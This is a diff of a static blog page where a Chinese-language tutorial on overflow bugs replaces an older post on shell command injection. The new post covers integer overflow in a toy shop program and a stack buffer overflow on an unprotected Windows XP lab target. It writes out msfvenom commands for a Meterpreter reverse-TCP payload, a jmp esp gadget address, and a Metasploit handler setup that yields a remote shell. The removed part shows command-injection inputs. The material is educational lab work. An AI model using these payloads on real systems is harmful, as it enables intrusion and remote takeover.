@@ -206,7 +206,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/21/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/23/%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/Image.JPG">
@@ -220,7 +220,7 @@
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
           
-            <a href="/2020/04/21/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" class="post-title-link" itemprop="url">缓冲区溢出</a>
+            <a href="/2020/04/23/%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">溢出漏洞</a>
         </h1>
 
         <div class="post-meta">
@@ -230,14 +230,14 @@
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              <time title="Created: 2020-04-21 17:52:50" itemprop="dateCreated datePublished" datetime="2020-04-21T17:52:50+08:00">2020-04-21</time>
+              <time title="Created: 2020-04-23 15:40:43" itemprop="dateCreated datePublished" datetime="2020-04-23T15:40:43+08:00">2020-04-23</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-04-23 19:59:02" itemprop="dateModified" datetime="2020-04-23T19:59:02+08:00">2020-04-23</time>
+                <time title="Modified: 2020-04-24 16:47:39" itemprop="dateModified" datetime="2020-04-24T16:47:39+08:00">2020-04-24</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -262,10 +262,30 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>比较简单的漏洞样板：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">! /bin/bash</span></span><br><span class="line">echo $1</span><br></pre></td></tr></table></figure>
-<p>意思就是说打印传进来的第一个参数，例如：<code>./a.sh test</code><br>原本是这样的，但是和SQL注入一样，我们增加闭合来实现代码注入：<br><code>./a.sh ; ls</code><br><code>./a.sh | ls</code><br><code>./a.sh &amp;&amp; ls</code><br><code>./a.sh &amp; ls</code><br>最终输出的效果就是把我们的目录打印了出来。</p>
-<h1 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h1><p>用户提交大型数据，数据溢出到数据边界，占到别的内存了。<br>在下篇文章记录！</p>
+          <h1 id="溢出漏洞"><a href="#溢出漏洞" class="headerlink" title="溢出漏洞"></a>溢出漏洞</h1><p>下面的内容皆是自己的一些理解，没有太多专业术语。<br>溢出漏洞说白了就是对边界没有检验，而导致原先不应该在这里的数据反而阴差阳错的出现在了这里。<br>我大体的对溢出漏洞分为了两种：</p>
+<ul>
+<li>数据溢出</li>
+<li>缓冲区溢出</li>
+</ul>
+<p>第一种数据溢出应用场景主要是针对外挂和破解<br>第二种缓冲区溢出应用场景主要是针对渗透测试</p>
+<p>下面我会分别讲解这两种溢出的详细细节，那我们测试的程序是我写的测试小程序。</p>
+<h2 id="数据溢出"><a href="#数据溢出" class="headerlink" title="数据溢出"></a>数据溢出</h2><p>首先我们需要在一台XP系统上运行测试程序，然后我会监听你的8888端口<br>首先我们用nc去连接8888端口。<br><img src="img1.jpg" alt="nc连接"><br>连接上之后会显示banner信息，意思是你一共有15块钱，然后你要买苹果，一个苹果1块钱，那么我们的第一个目的是要实现无限购买苹果。<br>然后我们输入一个1传递过去，服务端会给我们响应：<br><img src="img2.jpg" alt="响应"><br>那么理论上我们只能买十五个苹果，那么我们如何去购买无限个苹果呢？<br>首先我们探测一下目标服务器的类型。<br><img src="img3.jpg" alt="目标服务器"><br>看到CPE的匹配最大概率是SP1和SP2，所以我们可以基本断定是32位的操作系统。<br>我们首先先猜测它存储这个剩余的钱使用的是int类型，所以这个三十二位的一个变量，那么我们就可以尝试一下溢出！<br>我们计算一下我们现在15块钱，如果我们买<code>3000000000</code>个苹果会怎么样？按照常规的思路是：15-3000000000=-2999999985，我们将会欠债这么多钱，但是事实上当我们真正的输入这么多钱过去之后我们会发现：<br><img src="img4.jpg" alt="left"><br>很奇怪，为什么我们会剩下<code>1294967311</code>这么多钱呢？<br>其实是事实上确实是<code>-2999999985</code>这么多，但是我们转换为二进制：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‭1111111111111111111111111111111101001101001011111010001000001111‬</span><br></pre></td></tr></table></figure>
+<p>这个长度是64位的，但是他使用的是32位的int存储，所以我们不得不丢失前面的32位，那我们的剩下的二进制：<code>‭01001101001011111010001000001111‬</code><br>那最终转换成十进制就是：<br><img src="img5.jpg" alt="calc"><br>在很久以前，如果游戏有漏洞，WPE抓游戏的封包然后溢出刷钱，当然我们也可以进行定值的计算，也就是逆向来算，通过你现在的钱，然后和你想要的钱计算出来你需要卖多少个苹果才会得到你真实的金钱，但是现在这种漏洞确实已经很难难难难难难难难难难难难难见到了。</p>
+<h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><p>上面的那个不检查边界引起的漏洞只能说我们只是欺骗了卖苹果的多找给我们钱，那么我们如何成为卖苹果的就是缓冲区溢出所要做的。<br>首先我们先要系统是XP没有开启DEP（开启的话呢绕过会有些麻烦，这里不详细将如何绕过）<br>如何检测你的虚拟机开没开DEP，首先我们打开我的电脑-&gt;属性：<br><img src="img6.jpg" alt="DEB"><br>如果那个noexecute=AlwaysOff的话呢说明这个DEP没有开启，系统是不会检测边界问题的，其实说白了就和我们当时玩XP内核用调试模式打开XP时候配置的boot.ini修改的位置一样，只不过我们这个时候是要更改noexecute这个属性。<br>然后重启一下，我们还是运行我们调试的程序。<br>这个时候我们要来做模糊测试了，首先我们的思路是这样子的，他既然没有检测我们的输入是否存在边界，那么我们就可以考虑，我们输入的内容会不会溢出到EIP这个寄存器呢？没错，这个就是我们想到的，那么我们如何检测呢？我们首先先用DBG附加我们的程序。<br>这里我们不能用OD，因为OD会捕获这个EIP位置的异常，我们需要设置，但是我怕我这里说了，会有点偏离文章主题，所以我们用一个<code>Immunity Debugger</code>，这个会把这个异常反馈给我们，我们用这个调试器附加进程，这个方便之处他可以查看进程开发的端口，容易选择，选择开放8888这个端口的进程。<br>我们先发送50个a给这个程序，看看这个程序会不会溢出。<br><img src="img7.jpg" alt="a"><br>发过去之后，我们立马过去看调试：<br><img src="img8.jpg" alt="EIP"><br>这个时候程序pause了，可以看到EIP变成了4个61！那么为什么会变成61呢？想了一下，我们输入了a，它对应的十六进制的ASCII正好就是61！所以我们可以基本确定的是，我们输入的内容中的一部分被溢出到了EIP这个寄存器。<br>那么我们下一步就是要来确定到底是哪个位置溢出的字符变成了EIP的值，所以我们这个时候就要来找，这个时候我们有两种思路：</p>
+<ol>
+<li>使用二分法</li>
+<li>使用特征字符<br>第一种就是比较基本的寻找，第二种就是输入50个不同的字符，然后看看是哪个位置的值覆盖了EIP。<br>第二种kali之前是带了可以生成的工具，但是我的kali不知道什么原因出错了，可能是Ruby的版本不同吧。<br>我就用二分法，也不是很难，就是在50个位置里面找一个位置，找个几次也就找出来了，这里的话呢我们最好用一个小脚本：<br><img src="img9.jpg" alt="jb"><br>很简单就是通过更改”B”字符乘的个数，来确定到底是第几个位置出现了，也就是到底是乘几才会让EIP变成4个“O”。<br>最终发现16个B之后的连续四个字节会覆盖EIP。<br><img src="img10.jpg" alt="O"><br>到此为止我们就已经完成了一半，我们现在可以控制程序的EIP，那么问题来了，虽然我们可以控制程序的EIP，那么如何让他执行我们想要执行的代码呢？这是一个问题。<br>这个时候我们多次尝试的过程中发现一个问题，当我们字符输入很多的时候，我们在四个“O”之后的内容会出现在栈中！这个意思就是说我们可以控制栈的内容：<br><img src="img11.jpg" alt="ESP"></li>
+</ol>
+<p>所以说溢出的结构是：</p>
+<p>——————————<br>原始位置<br>——————————<br>EIP<br>——————————<br>栈<br>——————————</p>
+<p>这个时候就可以想到，如果我们在栈中放入我们的恶意代码，然后让EIP的值等于ESP，那么就会在目标系统执行我们的木马。<br>好了那么我们现在需要一段恶意代码，也就是能够在目标系统留一个后门程序的，那么我们如何得到呢？其实kali提供给我们了一个程序可以生成这么一段汇编代码，使用msfvenom这个程序进行生成。<br>具体命令：<code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.209.138 lport=666 -a x86 -f c --platform windows</code><br><img src="img12.jpg" alt="msfvenom"><br>可以看到生成了一个Python格式的字节但是我们注意，可以看到我们这里面存在一个00，这个显然不是我们要的，因为00是字符串的结束啊，所以我们不能有00这个字节，那么我们就需要告诉他我们排除00这个badchar。<br><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.209.138 lport=666 -a x86 -f c --platform windows -b 00</code><br><img src="img13.jpg" alt="nobadchar"><br>这个就是没有00了，那么我们可以改一下我们的代码：<br><img src="img14.jpg" alt="code"><br>那么这个0x90是做什么的，其实就是怕不是第一个字符开始执行有点差错的话呢那么我们的程序就会终止，那么我们可以加几个NOP进行填充，这样保证我们的程序可以正确无误的执行。<br>我们大部分的工作完成了，但是还存在一个问题，那个OOOO到底要写成什么，我们肯定不能写成ESP的地址，那么怎么办？这个时候我们只能间接的进行实现了。<br>反正我们只要让EIP运行到ESP的位置，那么我们为什么不能找一个地址，这个地址存储的汇编代码是可以跳转到ESP的呢？<br>例如：<code>jmp esp</code>,<code>ret</code>,<code>jnz/jz/je/jne esp</code>，寻找这个样子的代码，第一个明显是最简单的，第二个的话呢我们还是需要构造一下，好让他能返回到ESP，第三个的话呢我们还需要考虑标志寄存器的一个问题（其实还有好多，这里我就举了这几个）。<br>所以我们现在就要找一个这个程序里面哪个地方存在<code>jmp esp</code>这条语句，我们只需要将OOOO设置为这个地址，然后EIP运行到这里的时候，然后他就会跳转到ESP。<br>我们首先要确定我们找到的这个地址他是不会改变的地址（ASLR），第二就是这个地址里面不能存在00，第三就是这个地址没有被SEH链保护，第四还要这个地址要是系统的DLL。<br>确定这一点之后，我们就要来查一下，这个DBG有个mona插件，可以网上下载，他支持查看：<code>!mona modules</code>:<br><img src="img15.jpg" alt="模块"><br>OD也有类似的插件。<br>我们尽量保证除了OS DLL这个选项是true，其他的选项都是FALSE，我们最终发现了<code>SLMFC.dll</code>，那么我们就在这个DLL中寻找<code>jmp esp</code>。<br>其实如果主程序的地址不是00开头的话呢应该也是可以用的，但是很可惜一般不太可能。<br>那么我们来寻找一下，使用命令：<code>!mona find -s &quot;\xff\xe4&quot; -m &quot;SLMFC.dll&quot;</code><br>最后得到：<br><img src="img16.jpg" alt="jmp"><br><code>jmp esp</code>对应的就是ff e4。<br>最后找到了这么多，随便选一个：<code>0x5f4b41e3</code><br>我们尝试一下，但是我们用的时候注意，我们这个地址是要能够执行的，如果不是的话呢要确保你的DEP是关闭的（上面说过了）。<br>还需要注意的是，我们内存的存储方式，需要反过来，也就是说我们要这样写：<code>\xe3\x41\x4b\x5f</code>。<br>这个样子就可以了，我们先用nc开一个侦听端口，端口号是666，我们在shellcode中设置的端口号：<code>nc -vlp 666</code><br>然后执行我们写好的代码：<br><img src="img17.jpg" alt="code"><br>然后注意nc。<br><img src="img18.jpg" alt="nc"><br>可以看到连接上来了，但是没有shell，这个我也不是太清楚，所以我们只能用msf给我们的功能，首先打开msf。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.209.138</span><br><span class="line">set LPORT 666</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
+<p><img src="img19.jpg" alt="msf"><br>监听好这个端口，注意我们这里用反向连接的shell。<br>然后我们再运行我们的溢出代码。<br><img src="img20.jpg" alt="shell"><br>shell来了，这个时候我们用一下试试正常不正常。<br><img src="img21.jpg" alt="sessions"></p>
+<p>发现不稳定，立马掉了可以说，这个时候我就去找了一下原因，发现0x0d这个居然也不可以有，这个换行我们也不得不当做坏字符，所以说，我们最好将所有的这个255字符全部尝试一下，然后将badchar一次找出，最后的命令是：<code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.209.138 lport=666 -a x86 -f c --platform windows -b 00 0d</code><br>生成的shellcode是可以用的，我们尝试获取一下目录：<br><img src="img22.jpg" alt="shell"><br><img src="img23.jpg" alt="org"><br>发现正常执行，没什么问题了。<br>到这里就是缓冲区溢出攻击完毕。</p>
+<h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>其实这是一个比较简单的溢出，真正的溢出比这个要麻烦许多，还需要绕过之类的，<br>为什么16之后是溢出的，大家可以自己去在思考一下，透漏一下，我在进行字符拷贝的时候给的缓冲区大小是15个字节。</p>
+<p>我一直觉得开发、渗透、逆向作为一个有机的循环链是做安全的核心。</p>
+<p><img src="img24.jpg" alt="circle"></p>
 
       
     </div>
@@ -285,7 +305,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/7/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/114/">114</a><a class="extend next" rel="next" href="/page/9/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+    <a class="extend prev" rel="prev" href="/page/7/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/115/">115</a><a class="extend next" rel="next" href="/page/9/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
@@ -352,7 +372,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">114</span>
+          <span class="site-state-item-count">115</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
